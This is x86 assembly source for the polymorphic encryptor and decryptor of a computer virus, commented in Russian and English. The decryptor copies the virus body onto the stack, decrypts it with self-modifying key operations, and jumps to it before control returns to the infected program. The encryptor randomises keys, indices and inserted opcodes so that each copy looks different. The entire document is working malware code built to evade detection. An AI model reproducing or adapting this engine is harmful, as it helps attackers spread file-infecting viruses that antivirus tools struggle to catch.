_loader:
	pushad
	mov ecx, 0
__vir_size_offs		equ $-4

_decryptor:
	lea edi, [esp-(virsize+2000h)]		
__vir_size_offs2		equ $-4
	and edi, -4
	mov eax, edi
	
;  virus is written to unused part of stack at address less than esp
;	
;         virus
;      [	s			t			a			c			k	]
;                                    ^esp

	mov esi, 01234567h
__vir_rva 	equ $-4
	pushad
	rep movsd	; copy virus to stack
	popad

	mov esi, edi	; esi - база блока, увел. на 256 байт каждые 1024 цикла расшифровки
					; esi=block base, 256bytes=block size

	; прогон€ем цикл расшифровки 1+(virsize(dwords)/64) раз 
	; number of blox in virus = 1+(virsize(dwords)/64) 
	sar ecx, 6
	inc ecx

	; инициализаци€ ключа
	mov edx, 01234567h
__hash_rva	equ $-4	; сюда надо захерачить последний из сгенерированных ключей
					; when encrypting, we must write last key here

__decrypt_loop:
	push ecx

	mov ecx, 1024	; xoring data 1024 times for one block at random indexes

	; инициализаци€ индекса
	; initialize dword index in block
	mov edi, 01234567h	; edi 32 индекс - младшие 6 из 32 разр€дов
__initial_edi equ $-4	; забить рандомом (4 байт)

__block_loop:
	push edi
	and edi, 3Fh
	xor [esi+edi*4], edx
modifydkey1:	; сюда вставл€ем разные команды (add, sub, xor)
	; insert add/sub/xor here
	sub edx, [esi+edi*4] ;esi	; (03|2B|33) BE	

	pop edi

modifydkey2:	; сюда ror/rol edx, n (n=0..1Fh)
	ror edx, 2	; константа 0...1Fh
modifydkey3 equ $+1	; сюда add, sub, xor	
	xor edx, 01234567h
modifydkey4 equ $-4	; сюда случайное 4 байт ; random 4 bytes

;	add edi, 4
	call modifyindex
;	and edi, 3Fh
;	sal edi, 2
	loop __block_loop
	pop ecx

	add esi, 256     ; size of block = 64 dwords = 256 bytes
	loop __decrypt_loop
;	add esp, 8

	jmp eax	; virus must execute POPAD before returning to infected program

modifyindex:  ; подпрограмма функци€ генерировани€ индекса 
; in/out: 
; edi = index 

	push edi edi
	fild 4 ptr [esp]
fopcodes:
fopcodes_num equ 10

	; эта штука затираетс€ полиморфным кодом 
	db	fopcodes_num*2 dup (90h)	; сюда заху€рить 10 fsin, fcos, f2xm1
									; write 10 * (fsin/fcos/f2xm1) here
	fstp 8 ptr [esp]
	pop edi
	add esp, 4
	ret
modyfyindex_size equ $-modifyindex

loader_size	equ $-_loader


_encryptor:
	; in
;	esi -> begin of data
; 	edi -> buffer
; 	ecx = size in bytes
;	edx = hash
; uses ebx, esi


	; fill buffer with random data
	pushad
	rdtsc
	mov [ebp+randseed-__x], eax

__fillbuf:
;	rdtsc
	push 100h
	push eax
	call my_rnd
	add esp, 4*2

	stosb
	loop __fillbuf

	popad


	; заполн€ем массив индесков - 1024 байта
	; fill indexes array - 1024 indexes
	pushad
	mov eax, 1024
	call _valloc
	mov [indexes], eax
	mov esi, eax
	mov ecx, 1024
	rdtsc
	mov edi, eax
	mov 4 ptr [ebp+__initial_edi-__x], eax	; начальный индекс при загрузке


__indexes_fill_loop:
	mov eax, edi 
	and al, 3Fh
	mov 1 ptr [esi], al
	call modifyindex 
	inc esi
	loop __indexes_fill_loop
	
	popad
	

	pushad
	mov ecx, virsize+8
	rep movsb	; copy data to buffer
	popad

	pushad

	sar ecx, 2+6	; прогон€ем внешний цикл 1+(virsize(dwords)/64) раз
	inc ecx
	; генерируем ключ
	rdtsc 
	mov [initial_key], eax
	
	; начинаем шифровать с конца
	; encrypting in reverse order
	mov eax, ecx
	dec eax
	sal eax, 8		; *256
	lea esi, [edi+eax]

	mov edx, [initial_key]

	; внешний цикл 
__encrypt_loop:

	push ecx
	mov ecx, 1024

__bl_loop:

	; изменение индекса
	; get indexes from array in reverse order 
	mov eax, [indexes]
	movzx eax, 1 ptr [eax+ecx-1]	; yo! muza! fuka!
	mov edi, eax


	; изменение ключа (обратное к изменению в декрипторе)
	; key change (reverse to one in decryptor)
modifyekey3 equ $+1	; сюда add, sub, xor
	xor edx, 01234567h
modifyekey4 equ $-4	; сюда случайное 4 байт

modifyekey2:	; сюда ror/rol edx, n
	ror edx, 2

	mov eax, [esi+edi*4]	; сохран€ем незашифрованное

modifyekey1:	; сюда вставл€ем разные команды (add, sub, xor) 
	sub edx, eax		;  <--  (03|2b|33) D0    в реале [03 ea = add ebp, edx]

	xor [esi+edi*4], edx	; изменение данных

	cmp ecx, 1
	jnz __453
	mov 4 ptr [ebp+__hash_rva-__x], edx	; вот оно!!! какое ниибаца элегантное решение!
	; write last key to decryptor
__453:	


	loop __bl_loop
	pop ecx

	sub esi, 256
	loop __encrypt_loop

	mov eax, [indexes]
	call _vfree

	popad
	ret
